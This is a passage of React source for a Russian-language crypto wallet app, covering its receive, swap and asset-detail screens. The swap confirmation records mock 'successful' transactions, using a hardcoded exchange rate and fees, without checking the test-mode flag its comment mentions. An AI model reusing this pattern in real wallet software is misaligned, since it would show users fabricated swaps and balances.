                <div style={{ width: 32, height: 32, borderRadius: "50%", background: "#252530",
                  display: "flex", alignItems: "center", justifyContent: "center", marginRight: 12 }}>
                  <span style={{ color: "#888", fontSize: 12 }}>{net.name[0]}</span>
                </div>
                <span style={{ color: "white", fontSize: 15 }}>{net.name}</span>
              </div>
            ))}
          </div>
        </>
      )}
    </div>
  );
}


/* ─── Screen: Receive — QR code ─────────────────────────────── */
function ReceiveQRScreen({ assetId, onBack }) {
  const { addresses } = useWallet();
  const asset = BASE_ASSETS.find((a) => a.id === assetId);
  const address = getAddressForAsset(assetId, addresses);
  const displayAddress = address || "—";
  const [copied, setCopied] = useState(false);

  function handleCopy() {
    if (!address) return;
    copyToClipboard(address);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  const networkName = ASSET_TO_CHAIN[assetId] || assetId.toUpperCase();

  return (
    <div style={{ display: 'flex', flexDirection: 'column', flex: 1, position: 'relative', background: DS.bg }}>
      <TopBar title='Получить' onBack={onBack}
        rightEl={
          <button style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4 }}>
            <svg viewBox='0 0 24 24' fill='none' style={{ width: 20, height: 20 }}>
              <path d='M4 12v7a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7' stroke='white' strokeWidth='1.8' strokeLinecap='round' />
              <path d='M16 6l-4-4-4 4M12 2v13' stroke='white' strokeWidth='1.8' strokeLinecap='round' strokeLinejoin='round' />
            </svg>
          </button>
        }
      />

      {/* coin badge */}
      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', paddingTop: 8, paddingBottom: 16 }}>
        <div style={{ width: 60, height: 60, borderRadius: '50%', overflow: 'hidden' }}>
          <TokenIcon tokenId={asset.tokenId} size={60} badgeSize={22} />
        </div>
        <div style={{ color: 'white', fontWeight: 700, fontSize: 17, marginTop: 8 }}>{asset.name}</div>
        <div style={{ color: DS.muted, fontSize: 13, marginTop: 2 }}>{networkName} сеть</div>
      </div>

      {/* QR card */}
      <div style={{ margin: '0 20px', background: 'white', borderRadius: 28,
        padding: '24px 20px 20px', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 18,
        boxShadow: '0 8px 32px rgba(0,0,0,0.35)' }}>
        <div style={{ borderRadius: 12, overflow: 'hidden', lineHeight: 0 }}>
          <WalletQRCode address={address} size={210} />
        </div>

        {/* address pill */}
        <div style={{ width: '100%', background: '#F2F2F7', borderRadius: 14,
          padding: '10px 14px', textAlign: 'center' }}>
          <div style={{ color: '#6B6B6B', fontSize: 11, fontWeight: 500, marginBottom: 4, letterSpacing: 0.3 }}>
            Адрес кошелька
          </div>
          <div style={{ color: '#111', fontSize: 12, fontWeight: 600, wordBreak: 'break-all', lineHeight: 1.5 }}>
            {displayAddress}
          </div>
        </div>
      </div>

      {/* hint */}
      <div style={{ padding: '14px 28px', textAlign: 'center' }}>
        <div style={{ color: DS.muted, fontSize: 12, lineHeight: 1.6 }}>
          Отправляйте только{' '}
          <span style={{ color: 'white', fontWeight: 600 }}>{asset.symbol}</span>{' '}
          в сети <span style={{ color: 'white', fontWeight: 600 }}>{networkName}</span>. Мемо не требуется.
        </div>
      </div>

      {/* copy button */}
      <div style={{ padding: '8px 20px 20px', marginTop: 'auto' }}>
        <button onClick={handleCopy}
          style={{ width: '100%', padding: '16px 0', borderRadius: 16, border: 'none',
            background: !address ? DS.muted : copied ? DS.green : DS.blue,
            color: 'white', fontSize: 16,
            fontWeight: 600, cursor: address ? 'pointer' : 'default',
            display: 'flex', alignItems: 'center',
            justifyContent: 'center', gap: 8, transition: 'background 0.25s',
            boxShadow: copied ? '0 4px 16px rgba(52,199,89,0.4)' : '0 4px 16px rgba(0,122,255,0.3)' }}>
          <svg viewBox='0 0 24 24' fill='none' style={{ width: 18, height: 18 }}>
            <rect x='8' y='2' width='13' height='17' rx='2' stroke='white' strokeWidth='1.7' />
            <path d='M3 6v13a2 2 0 0 0 2 2h10' stroke='white' strokeWidth='1.7' strokeLinecap='round' />
          </svg>
          {copied ? 'Скопировано ✓' : 'Копировать адрес'}
        </button>
      </div>
    </div>
  );
}

/* ─── Swap: asset selector ───────────────────────────────────── */
function SwapAssetSelectScreen({ title, assets: list, onBack, onSelect, recentIds }) {
  const { balances } = useWallet();
  const [search, setSearch] = useState("");

  const getRealBalance = (id) => {
    if (!balances) return 0;
    let val = 0;
    switch(id) {
      case 'ltc':      val = balances.LTC || balances.litecoin || 0; break;
      case 'eth':      val = balances.ETH || balances.ethereum || 0; break;
      case 'ton':      val = balances.TON || balances.ton || 0; break;
      case 'arb':      val = balances.ARB || balances.arbitrum || 0; break;
      case 'bnb':      val = balances.BNB || balances.bsc || 0; break;
      case 'sol':      val = balances.SOL || balances.solana || 0; break;
      case 'usdt-eth': val = balances._usdtByNetwork?.eth || 0; break;
      case 'usdt-bnb': val = balances._usdtByNetwork?.bnb || 0; break;
      case 'usdt-sol': val = balances._usdtByNetwork?.sol || 0; break;
      case 'usdt-ton': val = balances._usdtByNetwork?.ton || 0; break;
      case 'usdt-trx': val = balances._usdtByNetwork?.trx || 0; break;
      default: val = 0;
    }
    return parseFloat(val) || 0;
  };

  const filtered = list.filter((a) =>
    !search || a.name.toLowerCase().includes(search.toLowerCase()) || a.symbol.toLowerCase().includes(search.toLowerCase())
  );
  const recentItems = recentIds ? list.filter((a) => recentIds.includes(a.id)) : [];

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
      <TopBar title={title} onBack={onBack}
        rightEl={
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
            <path d="M3 6h18M7 12h10M11 18h2" stroke="white" strokeWidth="1.8" strokeLinecap="round" />
          </svg>
        }
      />
      <div style={{ padding: "0 16px 14px" }}>
        <div style={{ background: "#252530", borderRadius: 12, display: "flex", alignItems: "center", padding: "10px 14px", gap: 8 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18, flexShrink: 0 }}>
            <circle cx="11" cy="11" r="8" stroke="#888" strokeWidth="1.8" />
            <path d="M21 21l-4.35-4.35" stroke="#888" strokeWidth="1.8" strokeLinecap="round" />
          </svg>
          <input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Поиск"
            style={{ background: "none", border: "none", outline: "none", color: "white", fontSize: 15, width: "100%" }} />
        </div>
      </div>
      {recentItems.length > 0 && (
        <div style={{ padding: "0 16px 10px" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 8 }}>
            <span style={{ color: "#888", fontSize: 13 }}>Последние</span>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 14, height: 14 }}>
              <path d="M9 18l6-6-6-6" stroke="#888" strokeWidth="2" strokeLinecap="round" />
            </svg>
          </div>
          <div style={{ display: "flex", gap: 8 }}>
            {recentItems.map((a) => (
              <button key={a.id} onClick={() => onSelect(a.id)}
                style={{ display: "flex", alignItems: "center", gap: 6, background: "#252530", border: "none", borderRadius: 20, padding: "6px 12px", cursor: "pointer" }}>
                <div style={{ width: 20, height: 20 }}>
                  <TokenIcon tokenId={a.tokenId} size={20} badgeSize={8} />
                </div>
                <span style={{ color: "white", fontSize: 13, fontWeight: 600 }}>{a.symbol}</span>
              </button>
            ))}
          </div>
        </div>
      )}
      <div style={{ background: "#181820", borderRadius: 16, margin: "0 12px", overflow: "hidden" }}>
        {filtered.map((asset, i) => {
          const realBal = getRealBalance(asset.id);
          const balStr = fmtBal(realBal, asset.symbol);
          return (
            <div key={asset.id} onClick={() => onSelect(asset.id)}
              style={{ display: "flex", alignItems: "center", padding: "14px 16px", cursor: "pointer",
                borderBottom: i < filtered.length - 1 ? "1px solid #2A2A2C" : "none" }}>
              <div style={{ width: 44, height: 44, flexShrink: 0 }}>
                <TokenIcon tokenId={asset.tokenId} size={44} badgeSize={18} />
              </div>
              <div style={{ flex: 1, marginLeft: 12 }}>
                <span style={{ color: "white", fontWeight: 600, fontSize: 15 }}>{asset.name}</span>
                {asset.network && <span style={{ color: "#888", fontSize: 13, marginLeft: 6 }}>{asset.network}</span>}
              </div>
              <div style={{ textAlign: "right" }}>
                <div style={{ color: realBal === 0 ? "#555" : "white", fontSize: 14, fontWeight: 500 }}>{balStr}</div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

/* ─── Screen: Swap ───────────────────────────────────────────── */
function SwapScreen({ payId, receiveId, onBack, onSelectPay, onSelectReceive, onSwap }) {
  const { balances } = useWallet();
  const [amount, setAmount] = useState("0,05");
  const payAsset = payId ? swapPayAssets.find((a) => a.id === payId) : null;
  const receiveAsset = receiveId ? swapReceiveAssets.find((a) => a.id === receiveId) : null;

  const getRealBalance = (id) => {
    if (!balances) return 0;
    let val = 0;
    switch(id) {
      case 'ltc':      val = balances.LTC || balances.litecoin || 0; break;
      case 'eth':      val = balances.ETH || balances.ethereum || 0; break;
      case 'ton':      val = balances.TON || balances.ton || 0; break;
      case 'arb':      val = balances.ARB || balances.arbitrum || 0; break;
      case 'bnb':      val = balances.BNB || balances.bsc || 0; break;
      case 'sol':      val = balances.SOL || balances.solana || 0; break;
      case 'usdt-eth': val = balances._usdtByNetwork?.eth || 0; break;
      case 'usdt-bnb': val = balances._usdtByNetwork?.bnb || 0; break;
      case 'usdt-sol': val = balances._usdtByNetwork?.sol || 0; break;
      case 'usdt-ton': val = balances._usdtByNetwork?.ton || 0; break;
      case 'usdt-trx': val = balances._usdtByNetwork?.trx || 0; break;
      default: val = 0;
    }
    return parseFloat(val) || 0;
  };

  const receiveAmount = payAsset && receiveAsset && amount !== "0"
    ? (parseFloat(amount.replace(",", ".")) * 0.03384).toFixed(5).replace(".", ",")
    : "0";
  const canSwap = !!payAsset && !!receiveAsset && amount !== "0";

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, position: "relative" }}>
      <TopBar title="Обмен" onBack={onBack} />
      <div style={{ padding: "0 16px", display: "flex", flexDirection: "column", gap: 0 }}>
        <div style={{ color: "#888", fontSize: 13, marginBottom: 6, paddingLeft: 4 }}>Вы платите</div>
        <div style={{ background: "#181820", borderRadius: 14, padding: "14px 16px" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
            <input value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0"
              style={{ flex: 1, background: "none", border: "none", outline: "none", color: "white", fontSize: 22, fontWeight: 600, width: "100%" }} />
            <button onClick={onSelectPay}
              style={{ display: "flex", alignItems: "center", gap: 8, background: "#252530", border: "none",
                borderRadius: 20, padding: "8px 14px", cursor: "pointer", flexShrink: 0 }}>
              {payAsset ? (
                <>
                  <div style={{ width: 22, height: 22 }}>
                    <TokenIcon tokenId={payAsset.tokenId} size={22} badgeSize={10} />
                  </div>
                  <span style={{ color: "white", fontWeight: 600, fontSize: 14 }}>{payAsset.symbol}</span>
                </>
              ) : (
                <span style={{ color: "#888", fontSize: 14, whiteSpace: "nowrap" }}>Выберите актив</span>
              )}
              <svg viewBox="0 0 24 24" fill="none" style={{ width: 14, height: 14 }}>
                <path d="M6 9l6 6 6-6" stroke="#888" strokeWidth="2" strokeLinecap="round" />
              </svg>
            </button>
          </div>
          {payAsset && <div style={{ color: "#888", fontSize: 12, marginTop: 6 }}>Баланс: {fmtBal(getRealBalance(payAsset.id), payAsset.symbol)}</div>}
        </div>

        <div style={{ display: "flex", justifyContent: "center", padding: "8px 0" }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
            <path d="M12 5v14M12 19l-4-4M12 19l4-4" stroke="#888" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </div>

        <div style={{ color: "#888", fontSize: 13, marginBottom: 6, paddingLeft: 4 }}>Вы получаете</div>
        <div style={{ background: "#181820", borderRadius: 14, padding: "14px 16px" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
            <div style={{ flex: 1, overflow: "hidden" }}>
              <span style={{ color: receiveAsset ? "white" : "#555", fontSize: 22, fontWeight: 600, display: "block", overflow: "hidden", textOverflow: "ellipsis" }}>
                {receiveAsset ? receiveAmount : "0"}
              </span>
              {!receiveAsset && (
                <div style={{ color: "#3B7DFF", fontSize: 13, marginTop: 4 }}>Обмен</div>
              )}
            </div>
            <button onClick={onSelectReceive}
              style={{ display: "flex", alignItems: "center", gap: 8, background: "#252530", border: "none",
                borderRadius: 20, padding: "8px 14px", cursor: "pointer", flexShrink: 0 }}>
              {receiveAsset ? (
                <>
                  <div style={{ width: 22, height: 22 }}>
                    <TokenIcon tokenId={receiveAsset.tokenId} size={22} badgeSize={10} />
                  </div>
                  <span style={{ color: "white", fontWeight: 600, fontSize: 14 }}>{receiveAsset.symbol}</span>
                </>
              ) : (
                <span style={{ color: "#888", fontSize: 14, whiteSpace: "nowrap" }}>Выберите актив</span>
              )}
              <svg viewBox="0 0 24 24" fill="none" style={{ width: 14, height: 14 }}>
                <path d="M6 9l6 6 6-6" stroke="#888" strokeWidth="2" strokeLinecap="round" />
              </svg>
            </button>
          </div>
          {receiveAsset && <div style={{ color: "#888", fontSize: 12, marginTop: 6 }}>Баланс: {fmtBal(getRealBalance(receiveAsset.id), receiveAsset.symbol)}</div>}
        </div>

        {payAsset && receiveAsset && (
          <div style={{ background: "#181820", borderRadius: 14, padding: "12px 16px", marginTop: 10,
            display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <span style={{ color: "#888", fontSize: 13 }}>Детали</span>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <span style={{ color: "#888", fontSize: 13 }}>1 {payAsset.symbol} ≈ 0,03384 {receiveAsset.symbol}</span>
              <span style={{ color: "#F59E0B", fontSize: 13 }}>(-1,09 %)</span>
              <svg viewBox="0 0 24 24" fill="none" style={{ width: 14, height: 14 }}>
                <path d="M9 18l6-6-6-6" stroke="#888" strokeWidth="2" strokeLinecap="round" />
              </svg>
            </div>
          </div>
        )}
      </div>
      <div style={{ padding: "16px", marginTop: "auto" }}>
        <button onClick={() => canSwap && onSwap(amount)}
          style={{ width: "100%", padding: "17px 0", borderRadius: 14, border: "none",
            background: canSwap ? "linear-gradient(145deg, #4F8FFF, #1A55E3)" : "#252530", color: canSwap ? "white" : "#555",
            fontSize: 16, fontWeight: 600, cursor: canSwap ? "pointer" : "default", transition: "background 0.2s" }}>
          Обмен
        </button>
      </div>
    </div>
  );
}

/* ─── Screen: Swap confirm ───────────────────────────────────── */
function SwapConfirmScreen({ payId, receiveId, payAmount, onBack, onConfirm }) {
  const { fireNotif, settings: swapSettings, addMockTransaction, testMode } = useWallet();
  const payAsset = swapPayAssets.find((a) => a.id === payId);
  const receiveAsset = swapReceiveAssets.find((a) => a.id === receiveId);
  const receiveAmountNum = parseFloat(payAmount.replace(",", ".")) * 0.03384;
  const receiveAmount = receiveAmountNum.toFixed(5).replace(".", ",");
  const [done, setDone] = useState(false);

  function handleConfirm() {
    setDone(true);

    // In test mode: record both legs as mock transactions so balance & activity update
    addMockTransaction({
      assetId: payId,
      amount: payAmount.replace(",", "."),
      from: "Ваш кошелек",
      to: receiveAsset?.name || receiveId,
      type: "Отправлено",
      status: "Успешный",
    });
    addMockTransaction({
      assetId: receiveId,
      amount: receiveAmountNum.toFixed(6),
      from: payAsset?.name || payId,
      to: "Ваш кошелек",
      type: "Получено",
      status: "Успешный",
    });

    fireNotif(
      `Обмен выполнен`,
      `${payAmount} ${payAsset?.symbol} → ${receiveAmount} ${receiveAsset?.symbol}`
    );
    setTimeout(onConfirm, 1200);
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
      <TopBar title="Обмен" onBack={onBack} />
      <div style={{ background: "#181820", borderRadius: 16, margin: "0 16px 12px", overflow: "hidden" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px 16px 8px" }}>
          <div>
            <div style={{ color: "white", fontSize: 22, fontWeight: 700 }}>{payAmount} {payAsset.symbol}</div>
            <div style={{ color: "#888", fontSize: 13, marginTop: 2 }}>0,0955 $</div>
          </div>
          <div style={{ width: 40, height: 40, borderRadius: "50%", overflow: "hidden" }}>
            <TokenIcon tokenId={payAsset.tokenId} size={40} badgeSize={16} />
          </div>
        </div>
        <div style={{ display: "flex", justifyContent: "center", padding: "4px 0" }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18 }}>
            <path d="M12 5v14M12 19l-4-4M12 19l4-4" stroke="#888" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </div>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "8px 16px 16px" }}>
          <div>
            <div style={{ color: "white", fontSize: 22, fontWeight: 700 }}>{receiveAmount} {receiveAsset.symbol}</div>
            <div style={{ color: "#888", fontSize: 13, marginTop: 2 }}>0,09446 $</div>
          </div>
          <div style={{ width: 40, height: 40, borderRadius: "50%", overflow: "hidden" }}>
            <TokenIcon tokenId={receiveAsset.tokenId} size={40} badgeSize={16} />
          </div>
        </div>
      </div>
      <div style={{ background: "#181820", borderRadius: 14, margin: "0 16px 10px", overflow: "hidden" }}>
        {[
          { label: "Кошелек", value: swapSettings?.walletName || 'Кошелек № 1', arrow: false },
          { label: "Сеть", value: payAsset.symbol, icon: <div style={{ width: 20, height: 20, display: "inline-block", marginLeft: 6 }}><TokenIcon tokenId={payAsset.tokenId} size={20} badgeSize={8} /></div>, arrow: false },
        ].map((row, i) => (
          <div key={row.label} style={{ display: "flex", alignItems: "center", justifyContent: "space-between",
            padding: "14px 16px", borderBottom: i === 0 ? "1px solid #2A2A2C" : "none" }}>
            <span style={{ color: "white", fontSize: 15 }}>{row.label}</span>
            <div style={{ display: "flex", alignItems: "center" }}>
              <span style={{ color: "#888", fontSize: 15 }}>{row.value}</span>
              {row.icon}
            </div>
          </div>
        ))}
      </div>
      <div style={{ background: "#181820", borderRadius: 14, margin: "0 16px 10px", padding: "14px 16px",
        display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <span style={{ color: "#888", fontSize: 13 }}>Детали</span>
        <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
          <span style={{ color: "#888", fontSize: 13 }}>1 {payAsset.symbol} ≈ 0,03384 {receiveAsset.symbol}</span>
          <span style={{ color: "#F59E0B", fontSize: 13 }}>(-1,09 %)</span>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 14, height: 14 }}>
            <path d="M9 18l6-6-6-6" stroke="#888" strokeWidth="2" strokeLinecap="round" /></svg>
        </div>
      </div>
      <div style={{ background: "#181820", borderRadius: 14, margin: "0 16px", padding: "14px 16px",
        display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
          <span style={{ color: "white", fontSize: 15 }}>Сетевая плата</span>
          <div style={{ width: 16, height: 16, borderRadius: "50%", border: "1.5px solid #555",
            display: "flex", alignItems: "center", justifyContent: "center" }}>
            <span style={{ color: "#555", fontSize: 10, fontWeight: 700 }}>i</span>
          </div>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
          <span style={{ color: "#888", fontSize: 15 }}>0,0191 $</span>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 14, height: 14 }}>
            <path d="M9 18l6-6-6-6" stroke="#888" strokeWidth="2" strokeLinecap="round" /></svg>
        </div>
      </div>
      <div style={{ padding: "16px", marginTop: "auto" }}>
        <button onClick={handleConfirm}
          style={{ width: "100%", padding: "17px 0", borderRadius: 14, border: "none",
            background: done ? "linear-gradient(145deg, #34D760, #20A845)" : "linear-gradient(145deg, #4F8FFF, #1A55E3)", color: "white",
            fontSize: 16, fontWeight: 600, cursor: "pointer", transition: "background 0.3s" }}>
          {done ? "✓ Обменяно!" : "Подтвердить"}
        </button>
      </div>
    </div>
  );
}

/* ─── Screen: Asset Detail ───────────────────────────────────── */
function AssetDetailScreen({ assetId, onBack, onSend, onReceive, onBuy, onSwap }) {
  const { balances, mockTransactions, settings: detailSettings } = useWallet();
  const liveAssets = useAssets();
  const asset = liveAssets.find((a) => a.id === assetId);

  // Build real balance for this asset
  const getRealBalance = (id) => {
    if (!balances) return 0;
    let val = 0;
    switch(id) {
      case 'btc':      val = balances.BTC || balances.bitcoin || 0; break;
      case 'ltc':      val = balances.LTC || balances.litecoin || 0; break;
      case 'eth':      val = balances.ETH || balances.ethereum || 0; break;
      case 'ton':      val = balances.TON || balances.ton || 0; break;
      case 'arb':      val = balances.ARB || balances.arbitrum || 0; break;
      case 'bnb':      val = balances.BNB || balances.bsc || 0; break;
      case 'sol':      val = balances.SOL || balances.solana || 0; break;
      case 'usdt-eth': val = balances._usdtByNetwork?.eth || 0; break;
      case 'usdt-bnb': val = balances._usdtByNetwork?.bnb || 0; break;
      case 'usdt-sol': val = balances._usdtByNetwork?.sol || 0; break;
      case 'usdt-ton': val = balances._usdtByNetwork?.ton || 0; break;
      case 'usdt-trx': val = balances._usdtByNetwork?.trx || 0; break;
      default: val = 0;
    }
    return parseFloat(val) || 0;
  };

  if (!asset) return null;

  const realBal = getRealBalance(assetId);
  const balStr = fmtBal(realBal, asset.symbol);
  
  const _detailLivePriceMap = useLivePriceMap();
  const getApproxPrice = (id) => {
    if (!id || id.startsWith('usdt')) return 1.00;
    const live = _detailLivePriceMap[id];
    if (live) return live.usdPrice;
    return BASE_ASSETS.find(a => a.id === id)?.usdPrice || 0;
  };
  const usdVal = realBal > 0 ? `${(realBal * getApproxPrice(assetId)).toFixed(2).replace(".", ",")} $` : "0,00 $";

  // Filter transactions for this specific asset
  const transactions = mockTransactions.filter(tx => tx.assetId === assetId).map(tx => ({
    id: tx.id,
    type: tx.type,
    amount: `${tx.type === 'Отправлено' ? '-' : '+'}${fmtCryptoAmt(tx.amount)} ${asset.symbol}`,
    sub: tx.type === 'Отправлено' ? (tx.to ? `На: ${tx.to.slice(0,8)}…` : 'Ваш кошелек') : `От: ${tx.from || 'Ваш кошелек'}`,
    positive: tx.type !== 'Отправлено',
    status: tx.status,
    pendingUntil: tx.pendingUntil,
    tokenId: asset.tokenId
  }));

  const actionButtons = [
    {
      label: "Отправить",
      onClick: onSend,
      icon: <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}><path d="M22 2L11 13" stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/><path d="M22 2L15 22L11 13L2 9L22 2Z" stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/></svg>,
    },
    {
      label: "Получить",
      onClick: onReceive,
      icon: <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}><rect x="3" y="3" width="7" height="7" rx="1" stroke="white" strokeWidth="2"/><rect x="5" y="5" width="3" height="3" fill="white"/><rect x="14" y="3" width="7" height="7" rx="1" stroke="white" strokeWidth="2"/><rect x="16" y="5" width="3" height="3" fill="white"/><rect x="3" y="14" width="7" height="7" rx="1" stroke="white" strokeWidth="2"/><rect x="5" y="16" width="3" height="3" fill="white"/><path d="M14 14h3v3h-3zM17 17h3v3h-3zM14 20h3v1h-3z" fill="white"/></svg>,
    },
    {
      label: "Купить",
      onClick: onBuy,
      icon: <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}><text x="12" y="17" textAnchor="middle" fill="white" fontSize="18" fontWeight="bold" fontFamily="Arial">$</text></svg>,
    },
    {
      label: "Обмен",
      onClick: onSwap,
      icon: <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}><path d="M20 12A8 8 0 0 0 5.07 7.5" stroke="white" strokeWidth="2.2" strokeLinecap="round"/><path d="M4 12a8 8 0 0 0 14.93 4.5" stroke="white" strokeWidth="2.2" strokeLinecap="round"/><path d="M5 4v4h4" stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/><path d="M19 20v-4h-4" stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/></svg>,
    },
  ];

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
      {/* TopBar — только стрелка назад и название, без правых кнопок */}
      <div style={{ display: "flex", alignItems: "center", padding: "16px 20px", gap: 12 }}>
        <button onClick={onBack} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
            <path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </button>
        <span style={{ flex: 1, color: "white", fontWeight: 600, fontSize: 17, textAlign: "center" }}>{asset.name}</span>
        <div style={{ width: 30 }} />
      </div>

      {/* Icon + balance */}
      <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "8px 0 24px" }}>
        <div style={{ width: 64, height: 64, borderRadius: "50%", overflow: "hidden" }}>
          <TokenIcon tokenId={asset.tokenId} size={64} badgeSize={24} />
        </div>
        <div style={{ color: "white", fontSize: 32, fontWeight: 700, marginTop: 16, letterSpacing: -0.5 }}>
          {detailSettings?.hideBalance ? "•••••" : balStr}
        </div>
        <div style={{ color: "#888", fontSize: 15, marginTop: 4 }}>
          {detailSettings?.hideBalance ? "•••••" : usdVal}
        </div>
      </div>

      {/* Action buttons — те же что на главном */}
      <div style={{ display: "flex", justifyContent: "space-around", padding: "0 24px 28px" }}>
        {actionButtons.map((btn) => (
          <div key={btn.label} style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 8, cursor: "pointer" }}
            onClick={btn.onClick}>
            <div style={{ width: 64, height: 64, borderRadius: "50%", background: "#3B7DFF", boxShadow: "0 4px 20px #3B7DFF66", display: "flex", alignItems: "center", justifyContent: "center" }}
              onMouseDown={(e) => (e.currentTarget.style.transform = "scale(0.93)")}
              onMouseUp={(e) => (e.currentTarget.style.transform = "scale(1)")}
              onMouseLeave={(e) => (e.currentTarget.style.transform = "scale(1)")}>
              {btn.icon}
            </div>
            <span style={{ color: "#AAAAAA", fontSize: 12 }}>{btn.label}</span>
          </div>
        ))}
      </div>

      {/* Info card: Цена / Сеть */}
      <div style={{ background: "#181820", borderRadius: 16, margin: "0 12px 20px", overflow: "hidden" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "15px 16px", borderBottom: "1px solid #222228" }}>
          <span style={{ color: "white", fontSize: 15 }}>Цена</span>
          <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
            <span style={{ color: "white", fontSize: 15 }}>{asset.price}</span>
            <span style={{ color: asset.positive ? "#34C759" : "#FF453A", fontSize: 14 }}>{asset.change}</span>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 14, height: 14 }}>
              <path d="M9 18l6-6-6-6" stroke="#888" strokeWidth="2" strokeLinecap="round" />
            </svg>
          </div>
        </div>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "15px 16px" }}>
          <span style={{ color: "white", fontSize: 15 }}>Сеть</span>
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <span style={{ color: "#888", fontSize: 15 }}>{asset.name}</span>
            <div style={{ width: 22, height: 22, borderRadius: "50%", overflow: "hidden" }}>
              <TokenIcon tokenId={asset.tokenId} size={22} badgeSize={10} />
            </div>
          </div>
        </div>
      </div>

      {/* Transactions */}
      {transactions.length > 0 && (
        <>
          <div style={{ padding: "0 16px 8px" }}>
            <span style={{ color: "#888", fontSize: 13 }}>Сегодня</span>
          </div>
          <div style={{ background: DS.card, borderRadius: 20, margin: "0 12px", overflow: "hidden", border: `1px solid ${DS.border}` }}>
            {transactions.map((tx, i) => {
              const isPending = tx.status === 'В процессе' && tx.pendingUntil;
              const isCancelled = tx.status === 'Отменена';
              const amtColor = isPending ? '#FF9F0A' : isCancelled ? DS.muted : tx.positive ? DS.green : DS.danger;
              const badgeBg = isPending ? '#FF9F0A' : isCancelled ? '#636366' : tx.positive ? DS.green : DS.danger;
              return (
              <div key={tx.id} style={{ display: "flex", alignItems: "center", padding: "16px",
                borderBottom: i < transactions.length - 1 ? `1px solid ${DS.border}` : "none",
                background: isPending ? "rgba(255,159,10,0.04)" : "none" }}>
                <div style={{ position: "relative", width: 48, height: 48, flexShrink: 0 }}>
                  <div style={{ width: 48, height: 48, borderRadius: "50%", overflow: "hidden", background: DS.input,
                    display: "flex", alignItems: "center", justifyContent: "center" }}>
                    <div style={{ width: 32, height: 32 }}>
                      <TokenIcon tokenId={tx.tokenId} size={32} badgeSize={12} />
                    </div>
                  </div>
                  <div style={{ position: "absolute", bottom: -2, right: -2, width: 20, height: 20, borderRadius: "50%",
                    background: badgeBg, border: `2px solid ${DS.card}`,
                    display: "flex", alignItems: "center", justifyContent: "center" }}>
                    {isPending ? (
                      <svg viewBox="0 0 24 24" fill="none" style={{ width: 11, height: 11 }}>
                        <circle cx="12" cy="12" r="9" stroke="white" strokeWidth="2.5" />
                        <path d="M12 7v5l3 3" stroke="white" strokeWidth="2.5" strokeLinecap="round" />
                      </svg>
                    ) : isCancelled ? (
                      <svg viewBox="0 0 24 24" fill="none" style={{ width: 11, height: 11 }}>
                        <path d="M18 6L6 18M6 6l12 12" stroke="white" strokeWidth="3" strokeLinecap="round" />
                      </svg>
                    ) : (
                      <svg viewBox="0 0 24 24" fill="none" style={{ width: 12, height: 12 }}>
                        {tx.positive
                          ? <path d="M12 17V7M7 12l5 5 5-5" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
                          : <path d="M12 7v10M7 12l5-5 5 5" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
                        }
                      </svg>
                    )}
                  </div>
                </div>
                <div style={{ flex: 1, marginLeft: 14 }}>
                  <div style={{ color: "white", fontWeight: 700, fontSize: 16 }}>{tx.type}</div>
                  <div style={{ color: DS.muted, fontSize: 13, marginTop: 2 }}>{tx.sub}</div>
                </div>
